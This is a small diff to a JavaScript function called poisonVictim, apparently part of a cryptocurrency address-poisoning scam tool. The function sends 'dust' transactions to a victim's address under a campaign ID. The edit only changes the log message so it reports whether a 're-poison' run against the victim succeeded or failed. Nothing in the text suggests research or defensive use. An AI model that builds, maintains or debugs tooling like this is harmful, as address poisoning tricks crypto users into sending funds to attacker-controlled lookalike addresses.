@@ -349,9 +349,10 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
     }
   }
 
-  // 🚀 NEW: Format message to include the TX hash if available
+  // 🚀 NEW: Clearly distinguish between success and failure in the message
   const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
-  const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
+  const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';
+  const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
   logger.info(msg);
 
   try {
